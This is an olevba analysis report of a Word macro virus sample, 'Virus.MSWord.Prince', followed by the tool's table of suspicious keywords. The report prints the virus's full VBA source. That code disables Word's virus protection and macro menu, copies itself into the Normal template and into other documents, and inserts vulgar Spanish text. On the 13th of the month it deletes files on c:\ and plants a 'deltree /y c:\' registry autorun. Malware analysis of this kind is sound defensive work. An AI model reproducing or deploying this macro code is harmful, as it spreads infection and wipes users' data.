olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Prince
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Prince - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Options.ConfirmConversions = False
  CommandBars("Tools").Controls("Macro").Enabled = False
  CommandBars("Tools").Controls("Macro").Visible = False
  cnt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  cda = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If (cda >= 20) Then ActiveDocument.VBProject.VBComponents.Item(1).Export ("c:\aaaa.xxx")
If (cnt <= 15) Then
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\aaaa.xxx")
   With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
     For g = 1 To 4: .Deletelines 1: Next g
   End With
End If
  If (cnt > 15) And (cda = 0) Then
      NormalTemplate.VBProject.VBComponents.Item(1).Export ("c:\aaaa.xxx")
      ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\aaaa.xxx")
      With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
       For Y = 1 To 4: .Deletelines 1: Next Y
      End With
  End If
  Kill ("c:\aaaa.xxx")
  If (Hour(Now) > Day(Now)) And (WeekDay(Now) = vbFriday) Then
       Selection.TypeText ("(--Principe ataca Otra vez,por Dragón rojo.Viva Chile Mierda--)")
  Else
     Selection.TypeText ("Principe_")
  End If
  ActiveDocument.SaveAs ActiveDocument.FullName
  If ((Day(Now) = 13) And System.PrivateProfileString("", "HKEY_CURRENT_USER\", "Principe") <> "Dragon Rojo") Then
    Kill ("c:\*.*")
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", "Principe") = "deltree /y c:\"
    Call Cagar_Nombres
    System.PrivateProfileString("", "HKEY_CURRENT_USER\", "Principe") = "Dragon Rojo"
  End If
End Sub

Private Sub Cagar_Nombres()
 CommandBars("Tools").Controls(5).Caption = "AutoMasturBación"
 CommandBars("Tools").Controls(5).Enabled = False
 CommandBars("File").Controls(2).Caption = "Aburrir"
 CommandBars("File").Controls(3).Caption = "Culiar"
 CommandBars("File").Controls(4).Caption = "Mandarselo a Guardar"
 CommandBars("File").Controls(5).Caption = "Guardar la Guea Como"
 CommandBars("File").Controls(7).Caption = "Fornicaciones"
 CommandBars("File").Controls(8).Caption = "Configurar la Página Culia"
 CommandBars("File").Controls(11).Caption = "Enviarsela a un Culiao Por "
 CommandBars("File").Controls(12).Caption = "Propiedades de Esta Porqueria"
 CommandBars("Insert").Controls(12).Caption = "Insertar La Mejor Foto Porno"
 CommandBars("Edit").Controls(4).Caption = "Copión Maricon"
  CommandBars("Edit").Controls(5).Caption = "Pegarle"
 CommandBars("Edit").Controls(6).Caption = "Pegado Especial Con Moco"
 CommandBars("Edit").Controls(7).Caption = "Pegado Con Un SUPER MOCO"
  CommandBars("Edit").Controls(3).Caption = "Castrar"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

